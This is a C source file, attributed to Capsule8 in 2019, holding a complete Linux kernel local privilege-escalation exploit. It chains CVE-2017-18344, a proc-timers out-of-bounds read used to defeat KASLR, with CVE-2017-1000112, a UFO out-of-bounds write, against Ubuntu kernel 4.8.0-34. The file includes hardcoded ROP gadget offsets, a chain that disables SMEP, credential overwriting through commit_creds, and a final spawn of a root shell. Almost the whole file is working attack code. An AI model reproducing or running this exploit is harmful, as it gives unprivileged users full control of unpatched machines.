// Capsule8 2019
// This exploit combines exploitation of two vulnerabilities:
// - CVE-2017-18344 (OOB read in proc timers)
// - CVE-2017-1000112 (OOB write due to UFO packet fragmentation management)
// Both original exploits were written by Andrey Konovalov.
//
// Tested to work on Ubuntu 4.8.0-34.

#define _GNU_SOURCE

#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <syscall.h>
#include <time.h>
#include <unistd.h>

#include <linux/socket.h>
#include <netinet/ip.h>
#include <sys/klog.h>
#include <sys/mman.h>
#include <sys/utsname.h>

#define ENABLE_SMEP_BYPASS		1


#define DEBUG 0
#define LOG_INFO	1
#define LOG_DEBUG	2

#define log(level, format, args...)					\
	do {								\
		if (level == LOG_INFO)					\
			printf(format, ## args);			\
		else							\
			fprintf(stderr, format, ## args);		\
	} while(0)

#define info(format, args...) log(LOG_INFO, format, ## args)

#if (DEBUG >= 1)
#define debug1(format, args...) log(LOG_DEBUG, format, ## args)
#else
#define debug1(format, args...)
#endif

#if (DEBUG >= 2)
#define debug2(format, args...) log(LOG_DEBUG, format, ## args)
#else
#define debug2(format, args...)
#endif

#define min(x, y) ((x) < (y) ? (x) : (y))

#define PAGE_SHIFT		12
#define PAGE_SIZE		(1ul << PAGE_SHIFT)

// Will be overwritten after leak.
unsigned long KERNEL_BASE =		0xffffffff81000000ul;
#define MIN_KERNEL_BASE 0xffffffff81000000ul
#define MAX_KERNEL_BASE 0xffffffffff000000ul
#define MAX_KERNEL_IMAGE 0x8000000ul // 128 MB

#define MMAP_ADDR_SPAN (MAX_KERNEL_BASE - MIN_KERNEL_BASE + MAX_KERNEL_IMAGE)
#define MMAP_ADDR_START 0x200000000ul
#define MMAP_ADDR_END (MMAP_ADDR_START + MMAP_ADDR_SPAN) // 0x286000000L

#define OPTIMAL_PTR_OFFSET ((MMAP_ADDR_START - MIN_KERNEL_BASE) / 8) // == 0x4fe00000L

#define MAX_MAPPINGS 1024
#define MEMFD_SIZE (MMAP_ADDR_SPAN / MAX_MAPPINGS)

// Will be overwritten by detect_versions().
int kernel = -1;

struct kernel_info {
	const char* distro;
	const char* version;
	uint64_t commit_creds;
	uint64_t prepare_kernel_cred;
	uint64_t xchg_eax_esp_ret;
	uint64_t pop_rdi_ret;
	uint64_t mov_dword_ptr_rdi_eax_ret;
	uint64_t mov_rax_cr4_ret;
	uint64_t neg_rax_ret;
	uint64_t pop_rcx_ret;
	uint64_t or_rax_rcx_ret;
	uint64_t xchg_eax_edi_ret;
	uint64_t mov_cr4_rdi_ret;
	uint64_t jmp_rcx;
	uint64_t divide_error;
    uint64_t copy_fs_struct;
};

struct kernel_info kernels[] = {
	{ "quantal", "4.8.0-34-generic", 0xa5d50, 0xa6140, 0x17d15, 0x6854d, 0x119227, 0x1b230, 0x4390da, 0x206c23, 0x7bcf3, 0x12c7f7, 0x64210, 0x49f80, 0x897200, 0x269b50},
	{ "xenial", "4.8.0-34-generic", 0xa5d50, 0xa6140, 0x17d15, 0x6854d, 0x119227, 0x1b230, 0x4390da, 0x206c23, 0x7bcf3, 0x12c7f7, 0x64210, 0x49f80, 0x897200, 0x269b50},
};

// Used to get root privileges.
#define COMMIT_CREDS			(KERNEL_BASE + kernels[kernel].commit_creds)
#define PREPARE_KERNEL_CRED		(KERNEL_BASE + kernels[kernel].prepare_kernel_cred)

#define COPY_FS_STRUCT          (KERNEL_BASE + kernels[kernel].copy_fs_struct)
#define TASK_PID_OFFSET 0x4C8
#define TASK_REAL_PARENT_OFFSET 0x4D8
#define TASK_FS_OFFSET 0x6B0

// Used when ENABLE_SMEP_BYPASS is used.
// - xchg eax, esp ; ret
// - pop rdi ; ret
// - mov dword ptr [rdi], eax ; ret
// - push rbp ; mov rbp, rsp ; mov rax, cr4 ; pop rbp ; ret
// - neg rax ; ret
// - pop rcx ; ret 
// - or rax, rcx ; ret
// - xchg eax, edi ; ret
// - push rbp ; mov rbp, rsp ; mov cr4, rdi ; pop rbp ; ret
// - jmp rcx
#define XCHG_EAX_ESP_RET		(KERNEL_BASE + kernels[kernel].xchg_eax_esp_ret)
#define POP_RDI_RET			(KERNEL_BASE + kernels[kernel].pop_rdi_ret)
#define MOV_DWORD_PTR_RDI_EAX_RET	(KERNEL_BASE + kernels[kernel].mov_dword_ptr_rdi_eax_ret)
#define MOV_RAX_CR4_RET			(KERNEL_BASE + kernels[kernel].mov_rax_cr4_ret)
#define NEG_RAX_RET			(KERNEL_BASE + kernels[kernel].neg_rax_ret)
#define POP_RCX_RET			(KERNEL_BASE + kernels[kernel].pop_rcx_ret)
#define OR_RAX_RCX_RET			(KERNEL_BASE + kernels[kernel].or_rax_rcx_ret)
#define XCHG_EAX_EDI_RET		(KERNEL_BASE + kernels[kernel].xchg_eax_edi_ret)
#define MOV_CR4_RDI_RET			(KERNEL_BASE + kernels[kernel].mov_cr4_rdi_ret)
#define JMP_RCX				(KERNEL_BASE + kernels[kernel].jmp_rcx)

// * * * * * * * * * * * * * * * Getting root * * * * * * * * * * * * * * * *

typedef unsigned long __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_copy_fs_struct)(unsigned long init_task);

uint64_t get_task(void) {
    uint64_t task;
    asm volatile ("movq %%gs: 0xD380, %0":"=r"(task));
    return task;
}

void get_root(void) {
    char *task;
    char *init;
    uint32_t pid = 0;

	((_commit_creds)(COMMIT_CREDS))(
	    ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));

    task = (char *)get_task();
    init = task;
    while (pid != 1) {
        init = *(char **)(init + TASK_REAL_PARENT_OFFSET);
        pid = *(uint32_t *)(init + TASK_PID_OFFSET);
    }
    
    *(uint64_t *)(task + TASK_FS_OFFSET) = ((_copy_fs_struct)(COPY_FS_STRUCT))(*(long unsigned int *)(init + TASK_FS_OFFSET));
}


// * * * * * * * * * * * * * * * * SMEP bypass * * * * * * * * * * * * * * * *

uint64_t saved_esp;

// Unfortunately GCC does not support `__atribute__((naked))` on x86, which
// can be used to omit a function's prologue, so I had to use this weird
// wrapper hack as a workaround. Note: Clang does support it, which means it
// has better support of GCC attributes than GCC itself. Funny.
void wrapper() {
	asm volatile ("					\n\
	payload:					\n\
		movq %%rbp, %%rax			\n\
		movq $0xffffffff00000000, %%rdx		\n\
		andq %%rdx, %%rax			\n\
		movq %0, %%rdx				\n\
		addq %%rdx, %%rax			\n\
		movq %%rax, %%rsp			\n\
		call get_root				\n\
		ret					\n\
	" : : "m"(saved_esp) : );
}


void payload();

#define CHAIN_SAVE_ESP				\
	*stack++ = POP_RDI_RET;			\
	*stack++ = (uint64_t)&saved_esp;	\
	*stack++ = MOV_DWORD_PTR_RDI_EAX_RET;

#define SMEP_MASK 0x100000

#define CHAIN_DISABLE_SMEP			\
	*stack++ = MOV_RAX_CR4_RET;		\
	*stack++ = NEG_RAX_RET;			\
	*stack++ = POP_RCX_RET;			\
	*stack++ = SMEP_MASK;			\
	*stack++ = OR_RAX_RCX_RET;		\
	*stack++ = NEG_RAX_RET;			\
	*stack++ = XCHG_EAX_EDI_RET;		\
	*stack++ = MOV_CR4_RDI_RET;

#define CHAIN_JMP_PAYLOAD                     \
	*stack++ = POP_RCX_RET;               \
	*stack++ = (uint64_t)&payload;        \
	*stack++ = JMP_RCX;

void mmap_stack() {
	uint64_t stack_aligned, stack_addr;
	int page_size, stack_size, stack_offset;
	uint64_t* stack;

	page_size = getpagesize();

	stack_aligned = (XCHG_EAX_ESP_RET & 0x00000000fffffffful) & ~(page_size - 1);
	stack_addr = stack_aligned - page_size * 4;
	stack_size = page_size * 8;
	stack_offset = XCHG_EAX_ESP_RET % page_size;

	stack = mmap((void*)stack_addr, stack_size, PROT_READ | PROT_WRITE,
			MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	if (stack == MAP_FAILED || stack != (void*)stack_addr) {
		perror("[-] mmap()");
		exit(EXIT_FAILURE);
	}

	stack = (uint64_t*)((char*)stack_aligned + stack_offset);

	CHAIN_SAVE_ESP;
	CHAIN_DISABLE_SMEP;
	CHAIN_JMP_PAYLOAD;
}

// * * * Below is code for CVE-2017-18344 * * * //

static struct proc_reader g_proc_reader;
static unsigned long g_leak_ptr_addr = 0;
#define PROC_INITIAL_SIZE 1024
#define PROC_CHUNK_SIZE 1024

struct proc_reader {
	char *buffer;
	int buffer_size;
	int read_size;
};

static void proc_init(struct proc_reader* pr) {
	debug2("proc_init: %p\n", pr);

	pr->buffer = malloc(PROC_INITIAL_SIZE);
	if (pr->buffer == NULL) {
		perror("[-] proc_init: malloc()");
		exit(EXIT_FAILURE);
	}
	pr->buffer_size = PROC_INITIAL_SIZE;
	pr->read_size = 0;

	debug2("proc_init = void\n");
}

static void proc_ensure_size(struct proc_reader* pr, int size) {
	if (pr->buffer_size >= size)
		return;
	while (pr->buffer_size < size)
		pr->buffer_size <<= 1;
	pr->buffer = realloc(pr->buffer, pr->buffer_size);
	if (pr->buffer == NULL) {
		perror("[-] proc_ensure_size: realloc()");
		exit(EXIT_FAILURE);
	}
}

static int proc_read(struct proc_reader* pr, const char *file) {
	debug2("proc_read: file: %s, pr->buffer_size: %d\n",
			file, pr->buffer_size);

	int fd = open(file, O_RDONLY);
	if (fd == -1) {
		perror("[-] proc_read: open()");
		exit(EXIT_FAILURE);
	}

	pr->read_size = 0;
	while (true) {
		proc_ensure_size(pr, pr->read_size + PROC_CHUNK_SIZE);
		int bytes_read = read(fd, &pr->buffer[pr->read_size],
					PROC_CHUNK_SIZE);
		if (bytes_read == -1) {
			perror("[-] read(proc)");
			exit(EXIT_FAILURE);
		}
		pr->read_size += bytes_read;
		if (bytes_read < PROC_CHUNK_SIZE)
			break;
	}

	close(fd);

	debug2("proc_read len = %d\n", pr->read_size);
	return pr->read_size;
}

/* sigval */
typedef union k_sigval {
	int sival_int;
	void *sival_ptr;
} k_sigval_t;

#define __ARCH_SIGEV_PREAMBLE_SIZE	(sizeof(int) * 2 + sizeof(k_sigval_t))
#define SIGEV_MAX_SIZE	64
#define SIGEV_PAD_SIZE	((SIGEV_MAX_SIZE - __ARCH_SIGEV_PREAMBLE_SIZE) \
				/ sizeof(int))

typedef struct k_sigevent {
	k_sigval_t sigev_value;
	int sigev_signo;
	int sigev_notify;
	union {
		int _pad[SIGEV_PAD_SIZE];
		int _tid;

		struct {
			void (*_function)(sigval_t);
			void *_attribute;
		} _sigev_thread;
	} _sigev_un;
} k_sigevent_t;

static void leak_setup() {
	k_sigevent_t se;
	memset(&se, 0, sizeof(se));
	se.sigev_signo = SIGRTMIN;
	se.sigev_notify = OPTIMAL_PTR_OFFSET;
	timer_t timerid = 0;

	int rv = syscall(SYS_timer_create, CLOCK_REALTIME,
				(void *)&se, &timerid);
	if (rv != 0) {
		perror("[-] timer_create()");
		exit(EXIT_FAILURE);
	}
}

static void leak_parse(char *in, int in_len, char **start, char **end) {
	const char *needle = "notify: ";
	*start = memmem(in, in_len, needle, strlen(needle));
	assert(*start != NULL);
	*start += strlen(needle);

	assert(in_len > 0);
	assert(in[in_len - 1] == '\n');
	*end = &in[in_len - 2];
	while (*end > in && **end != '\n')
		(*end)--;
	assert(*end > in);
	while (*end > in && **end != '/')
		(*end)--;
	assert(*end > in);
	assert((*end)[1] = 'p' && (*end)[2] == 'i' && (*end)[3] == 'd');

	assert(*end >= *start);
}

static void leak_once(char **start, char **end) {
	int read_size = proc_read(&g_proc_reader, "/proc/self/timers");
	leak_parse(g_proc_reader.buffer, read_size, start, end);
}



static int leak_once_and_copy(char *out, int out_len) {
	assert(out_len > 0);

	char *start, *end;
	leak_once(&start, &end);

	int size = min(end - start, out_len);
	memcpy(out, start, size);

	if (size == out_len)
		return size;

	out[size] = 0;
	return size + 1;
}

static void leak_range(unsigned long addr, size_t length, char *out) {
	size_t total_leaked = 0;
	while (total_leaked < 16) {
		unsigned long addr_to_leak = addr + total_leaked;
		*(unsigned long *)g_leak_ptr_addr = addr_to_leak;
		debug2("leak_range: offset %ld, addr: %lx\n",
			total_leaked, addr_to_leak);
		int leaked = leak_once_and_copy(out + total_leaked,
			length - total_leaked);
		total_leaked += leaked;
	}
}
// k_sigval

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

static void mmap_fixed(unsigned long addr, size_t size) {
	void *rv = mmap((void *)addr, size, PROT_READ | PROT_WRITE,
			MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (rv != (void *)addr) {
		perror("[-] mmap()");
		exit(EXIT_FAILURE);
	}
}

static void mmap_fd_over(int fd, unsigned long fd_size, unsigned long start,
			unsigned long end) {
	int page_size = PAGE_SIZE;
	assert(fd_size % page_size == 0);
	assert(start % page_size == 0);
	assert(end % page_size == 0);
	assert((end - start) % fd_size == 0);

	debug2("mmap_fd_over: [%lx, %lx)\n", start, end);

	unsigned long addr;
	for (addr = start; addr < end; addr += fd_size) {
		void *rv = mmap((void *)addr, fd_size, PROT_READ,
				MAP_FIXED | MAP_PRIVATE, fd, 0);
		if (rv != (void *)addr) {
			perror("[-] mmap()");
			exit(EXIT_FAILURE);
		}
	}

	debug1("mmap_fd_over = void\n");
}

static void remap_fd_over(int fd, unsigned long fd_size, unsigned long start,
			unsigned long end) {
	int rv = munmap((void *)start, end - start);
	if (rv != 0) {
		perror("[-] munmap()");
		exit(EXIT_FAILURE);
	}
	mmap_fd_over(fd, fd_size, start, end);
}

#define MEMFD_CHUNK_SIZE 0x1000

static int create_filled_memfd(const char *name, unsigned long size,
				unsigned long value) {
	int i;
	char buffer[MEMFD_CHUNK_SIZE];

	assert(size % MEMFD_CHUNK_SIZE == 0);

	int fd = syscall(SYS_memfd_create, name, 0);
	if (fd < 0) {
		perror("[-] memfd_create()");
		exit(EXIT_FAILURE);
	}

	for (i = 0; i < sizeof(buffer) / sizeof(value); i++)
		*(unsigned long *)&buffer[i * sizeof(value)] = value;

	for (i = 0; i < size / sizeof(buffer); i++) {
		int bytes_written = write(fd, &buffer[0], sizeof(buffer));
		if (bytes_written != sizeof(buffer)) {
			perror("[-] write(memfd)");
			exit(EXIT_FAILURE);
		}
	}

	return fd;
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #


#define CPUINFO_SMEP	1
#define CPUINFO_SMAP	2
#define CPUINFO_KAISER	4
#define CPUINFO_PTI	8

static const char *evil = "evil";
static const char *good = "good";

static bool bisect_probe() {
	char *start, *end;
	leak_once(&start, &end);
	return *start == 'g';
}

static unsigned long bisect_via_memfd(unsigned long fd_size,
				unsigned long start, unsigned long end) {
	assert((end - start) % fd_size == 0);

	int fd_evil = create_filled_memfd("evil", fd_size, (unsigned long)evil);
	int fd_good = create_filled_memfd("good", fd_size, (unsigned long)good);

	unsigned long left = 0;
	unsigned long right = (end - start) / fd_size;
	debug2("bisect_via_memfd: right starts at 0x%lx units\n", right);
	debug2("bvm: start loop!\n");

	while (right - left > 1) {
		unsigned long middle = left + (right - left) / 2;
		debug2("bvm: evil range (start->middle)=(0x%lx-0x%lx)\n", (start + left * fd_size), (start + middle * fd_size));
		remap_fd_over(fd_evil, fd_size, start + left * fd_size,
				start + middle * fd_size);
		debug2("bvm: good range (middle->end)=(0x%lx-0x%lx)\n", (start + middle * fd_size), (start + right * fd_size));
		remap_fd_over(fd_good, fd_size, start + middle * fd_size,
				start + right * fd_size);
		bool probe = bisect_probe();
		if (probe)
			left = middle;
		else
			right = middle;
	}

	int rv = munmap((void *)start, end - start);
	if (rv != 0) {
		perror("[-] munmap()");
		exit(EXIT_FAILURE);
	}

	close(fd_evil);
	close(fd_good);

	return start + left * fd_size;
}

static unsigned long bisect_via_assign(unsigned long start, unsigned long end) {
	int word_size = sizeof(unsigned long);

	assert((end - start) % word_size == 0);
	assert((end - start) % PAGE_SIZE == 0);

	mmap_fixed(start, end - start);

	unsigned long left = 0;
	unsigned long right = (end - start) / word_size;

	while (right - left > 1) {
		unsigned long middle = left + (right - left) / 2;
		unsigned long a;
		for (a = left; a < middle; a++)
			*(unsigned long *)(start + a * word_size) =
				(unsigned long)evil;
		for (a = middle; a < right; a++)
			*(unsigned long *)(start + a * word_size) =
				(unsigned long)good;
		bool probe = bisect_probe();
		if (probe)
			left = middle;
		else
			right = middle;
	}

	int rv = munmap((void *)start, end - start);
	if (rv != 0) {
		perror("[-] munmap()");
		exit(EXIT_FAILURE);
	}

	return start + left * word_size;
}

static unsigned long bisect_leak_ptr_addr() {
	unsigned long addr = bisect_via_memfd(
			MEMFD_SIZE, MMAP_ADDR_START, MMAP_ADDR_END);
	addr = bisect_via_memfd(PAGE_SIZE, addr, addr + MEMFD_SIZE);
	addr = bisect_via_assign(addr, addr + PAGE_SIZE);
	return addr;
}

static int cpuinfo_scan() {
	int length = proc_read(&g_proc_reader, "/proc/cpuinfo");
	char *buffer = &g_proc_reader.buffer[0];
	int rv = 0;
	char* found = memmem(buffer, length, "smep", 4);
	if (found != NULL)
		rv |= CPUINFO_SMEP;
	found = memmem(buffer, length, "smap", 4);
	if (found != NULL)
		rv |= CPUINFO_SMAP;
	found = memmem(buffer, length, "kaiser", 4);
	if (found != NULL)
		rv |= CPUINFO_KAISER;
	found = memmem(buffer, length, " pti", 4);
	if (found != NULL)
		rv |= CPUINFO_PTI;
	return rv;
}

static void cpuinfo_check() {
	int rv = cpuinfo_scan();
	if (rv & CPUINFO_SMAP) {
		info("[-] SMAP detected, no bypass available, aborting\n");
		exit(EXIT_FAILURE);
	}
}


static void arbitrary_read_init() {
	info("[>] setting up proc reader\n");
	proc_init(&g_proc_reader);
	info("[+] done\n");

	info("[>] checking /proc/cpuinfo\n");
	cpuinfo_check();
	info("[+] looks good\n");

	info("[>] setting up timer\n");
	leak_setup();
	info("[+] done\n");

	info("[>] finding leak pointer address\n");
	g_leak_ptr_addr = bisect_leak_ptr_addr();
	info("[+] done: %016lx\n", g_leak_ptr_addr);

	info("[>] mapping leak pointer page\n");
	mmap_fixed(g_leak_ptr_addr & ~(PAGE_SIZE - 1), PAGE_SIZE);
	info("[+] done\n");
}


static void read_range(unsigned long addr, size_t length, char *buffer) {
	leak_range(addr, length, buffer);
}

struct idt_register {
	uint16_t length;
	uint64_t base;
} __attribute__((packed));

struct idt_gate {
	uint16_t offset_1; // bits 0..15
	uint32_t shit_1;
	uint16_t offset_2; // bits 16..31
	uint32_t offset_3; // bits 32..63
	uint32_t shit_2;
} __attribute__((packed));

static uint64_t idt_gate_addr(struct idt_gate *gate) {
	uint64_t addr = gate->offset_1 + ((uint64_t)gate->offset_2 << 16) +
		((uint64_t)gate->offset_3 << 32);
	return addr;
}

static void get_idt(struct idt_register *idtr) {
	asm ( "sidt %0" : : "m"(*idtr) );
	debug1("get_idt_base: base: %016lx, length: %d\n",
			idtr->base, idtr->length);
}

static uint64_t read_idt_gate(int i) {
	char buffer[4096];
	struct idt_register idtr;

	get_idt(&idtr);
	assert(idtr.length <= sizeof(buffer));
	assert(i <= idtr.length / sizeof(struct idt_gate));
	read_range(idtr.base, idtr.length, &buffer[0]);

	struct idt_gate *gate = (struct idt_gate *)&buffer[0] + i;
	uint64_t addr = idt_gate_addr(gate);
	return addr;
}

// </IDT KASLR bypass>


// * * * Below is code for CVE-2017-100012 * * * //

// * * * * * * * * * * * * * * Kernel structs * * * * * * * * * * * * * * * *

struct ubuf_info {
	uint64_t callback;	// void (*callback)(struct ubuf_info *, bool)
	uint64_t ctx;		// void *
	uint64_t desc;		// unsigned long
};

struct skb_shared_info {
	uint8_t nr_frags;	// unsigned char
	uint8_t tx_flags;	// __u8
	uint16_t gso_size;	// unsigned short
	uint16_t gso_segs;	// unsigned short
	uint16_t gso_type;	// unsigned short
	uint64_t frag_list;	// struct sk_buff *
	uint64_t hwtstamps;	// struct skb_shared_hwtstamps
	uint32_t tskey;		// u32
	uint32_t ip6_frag_id;	// __be32
	uint32_t dataref;	// atomic_t
	uint64_t destructor_arg; // void *
	uint8_t frags[16][17];	// skb_frag_t frags[MAX_SKB_FRAGS];
};

struct ubuf_info ui;

void init_skb_buffer(char* buffer, unsigned long func) {
	struct skb_shared_info* ssi = (struct skb_shared_info*)buffer;
	memset(ssi, 0, sizeof(*ssi));

	ssi->tx_flags = 0xff;
	ssi->destructor_arg = (uint64_t)&ui;
	ssi->nr_frags = 0;
	ssi->frag_list = 0;

	ui.callback = func;
}

// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *

#define SHINFO_OFFSET 3164

void oob_execute(unsigned long payload) {
	char buffer[4096];
	memset(&buffer[0], 0x42, 4096);
	init_skb_buffer(&buffer[SHINFO_OFFSET], payload);

	int s = socket(PF_INET, SOCK_DGRAM, 0);
	if (s == -1) {
		perror("[-] socket()");
		exit(EXIT_FAILURE);
	}

	struct sockaddr_in addr;
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(8000);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

	if (connect(s, (void*)&addr, sizeof(addr))) {
		perror("[-] connect()");
		exit(EXIT_FAILURE);
	}

	int size = SHINFO_OFFSET + sizeof(struct skb_shared_info);
	int rv = send(s, buffer, size, MSG_MORE);
	if (rv != size) {
		perror("[-] send()");
		exit(EXIT_FAILURE);
	}

	int val = 1;
	rv = setsockopt(s, SOL_SOCKET, SO_NO_CHECK, &val, sizeof(val));
	if (rv != 0) {
		perror("[-] setsockopt(SO_NO_CHECK)");
		exit(EXIT_FAILURE);
	}

	send(s, buffer, 1, 0);

	close(s);
}

// * * * * * * * * * * * * * * * * * Detect * * * * * * * * * * * * * * * * *

#define CHUNK_SIZE 1024

int read_file(const char* file, char* buffer, int max_length) {
	int f = open(file, O_RDONLY);
	if (f == -1)
		return -1;
	int bytes_read = 0;
	while (true) {
		int bytes_to_read = CHUNK_SIZE;
		if (bytes_to_read > max_length - bytes_read)
			bytes_to_read = max_length - bytes_read;
		int rv = read(f, &buffer[bytes_read], bytes_to_read);
		if (rv == -1)
			return -1;
		bytes_read += rv;
		if (rv == 0)
			return bytes_read;
	}
}

#define LSB_RELEASE_LENGTH 1024

void get_distro_codename(char* output, int max_length) {
	char buffer[LSB_RELEASE_LENGTH];
	int length = read_file("/etc/lsb-release", &buffer[0], LSB_RELEASE_LENGTH);
	if (length == -1) {
		perror("[-] open/read(/etc/lsb-release)");
		exit(EXIT_FAILURE);
	}
	const char *needle = "DISTRIB_CODENAME=";
	int needle_length = strlen(needle);
	char* found = memmem(&buffer[0], length, needle, needle_length);
	if (found == NULL) {
		printf("[-] couldn't find DISTRIB_CODENAME in /etc/lsb-release\n");
		exit(EXIT_FAILURE);
	}
	int i;
	for (i = 0; found[needle_length + i] != '\n'; i++) {
		assert(i < max_length);
		assert((found - &buffer[0]) + needle_length + i < length);
		output[i] = found[needle_length + i];
	}
}

void get_kernel_version(char* output, int max_length) {
	struct utsname u;
	int rv = uname(&u);
	if (rv != 0) {
		perror("[-] uname())");
		exit(EXIT_FAILURE);
	}
	assert(strlen(u.release) <= max_length);
	strcpy(&output[0], u.release);
}

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))

#define DISTRO_CODENAME_LENGTH 32
#define KERNEL_VERSION_LENGTH 32

void detect_versions() {
	char codename[DISTRO_CODENAME_LENGTH];
	char version[KERNEL_VERSION_LENGTH];

	get_distro_codename(&codename[0], DISTRO_CODENAME_LENGTH);
	get_kernel_version(&version[0], KERNEL_VERSION_LENGTH);

	int i;
	for (i = 0; i < ARRAY_SIZE(kernels); i++) {
		if (strcmp(&version[0], kernels[i].version) == 0) {
			printf("[.] kernel version '%s' detected\n", kernels[i].version);
			kernel = i;
			return;
		}
	}

	printf("[-] kernel version not recognized\n");
	exit(EXIT_FAILURE);
}

#define PROC_CPUINFO_LENGTH 4096

// 0 - nothing, 1 - SMEP, 2 - SMAP, 3 - SMEP & SMAP
int smap_smep_enabled() {
	char buffer[PROC_CPUINFO_LENGTH];
	int length = read_file("/proc/cpuinfo", &buffer[0], PROC_CPUINFO_LENGTH);
	if (length == -1) {
		perror("[-] open/read(/proc/cpuinfo)");
		exit(EXIT_FAILURE);
	}
	int rv = 0;
	char* found = memmem(&buffer[0], length, "smep", 4);
	if (found != NULL)
		rv += 1;
	found = memmem(&buffer[0], length, "smap", 4);
	if (found != NULL)
		rv += 2;
	return rv;
}

void check_smep_smap() {
	int rv = smap_smep_enabled();
	if (rv >= 2) {
		printf("[-] SMAP detected, no bypass available\n");
		exit(EXIT_FAILURE);
	}
#if !ENABLE_SMEP_BYPASS
	if (rv >= 1) {
		printf("[-] SMEP detected, use ENABLE_SMEP_BYPASS\n");
		exit(EXIT_FAILURE);
	}
#endif
}

// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * * *

static bool write_file(const char* file, const char* what, ...) {
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);

	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		close(fd);
		return false;
	}
	close(fd);
	return true;
}

void setup_sandbox() {
	int real_uid = getuid();
	int real_gid = getgid();

	if (unshare(CLONE_NEWUSER) != 0) {
		printf("[!] unprivileged user namespaces are not available\n");
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}
	if (unshare(CLONE_NEWNET) != 0) {
		perror("[-] unshare(CLONE_NEWNET)");
		exit(EXIT_FAILURE);
	}

	if (!write_file("/proc/self/setgroups", "deny")) {
		perror("[-] write_file(/proc/self/set_groups)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)) {
		perror("[-] write_file(/proc/self/uid_map)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
		perror("[-] write_file(/proc/self/gid_map)");
		exit(EXIT_FAILURE);
	}

	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(0, &my_set);
	if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
		perror("[-] sched_setaffinity()");
		exit(EXIT_FAILURE);
	}

	if (system("/sbin/ifconfig lo mtu 1500") != 0) {
		perror("[-] system(/sbin/ifconfig lo mtu 1500)");
		exit(EXIT_FAILURE);
	}
	if (system("/sbin/ifconfig lo up") != 0) {
		perror("[-] system(/sbin/ifconfig lo up)");
		exit(EXIT_FAILURE);
	}
}

void exec_shell() {
	char* shell = "/bin/bash";
	char* args[] = {shell, "-i", NULL};
	execve(shell, args, NULL);
}

bool is_root() {
	// We can't simple check uid, since we're running inside a namespace
	// with uid set to 0. Try opening /etc/shadow instead.
	int fd = open("/etc/shadow", O_RDONLY);
	if (fd == -1)
		return false;
	close(fd);
	return true;
}

void check_root() {
	printf("[6] checking if we got root\n");
	if (!is_root()) {
		printf("[-] something went wrong =(\n");
		return;
	}
	printf("[+] got r00t ^_^\n");
	exec_shell();
}

int main(int argc, char** argv) {
	unsigned long int divide_error_addr = 0;
	printf("[^] starting\n");
	printf("[=] running KASLR defeat exploit (CVE-2017-18344)\n");
	printf("[0] enumerating divide_error() location (CVE-2017-18344)\n");
	arbitrary_read_init();
	divide_error_addr = read_idt_gate(0);
	printf("[+] divide_error is at:        %lx\n", divide_error_addr);

	printf("[1] checking distro and kernel versions\n");
	detect_versions();
	printf("[+] done, versions looks good\n");
	KERNEL_BASE = divide_error_addr - kernels[kernel].divide_error;

	printf("[2] checking SMEP and SMAP\n");
	check_smep_smap();
	printf("[+] done, looks good\n");

	printf("[=] running privilege escalation exploit (CVE-2017-1000112)\n");
	printf("[3] setting up namespace sandbox\n");
	setup_sandbox();
	printf("[+] done, namespace sandbox set up\n");

	printf("[~] commit_creds:        %lx\n", COMMIT_CREDS);
	printf("[~] prepare_kernel_cred: %lx\n", PREPARE_KERNEL_CRED);

	unsigned long payload = (unsigned long)&get_root;

#if ENABLE_SMEP_BYPASS
	printf("[4] SMEP bypass enabled, mmapping fake stack\n");
	mmap_stack();
	payload = XCHG_EAX_ESP_RET;
	printf("[+] done, fake stack mmapped\n");
#endif

	printf("[5] executing payload %lx\n", payload);
	oob_execute(payload);
	printf("[+] done, should be root now\n");

	check_root();

	return 0;
}
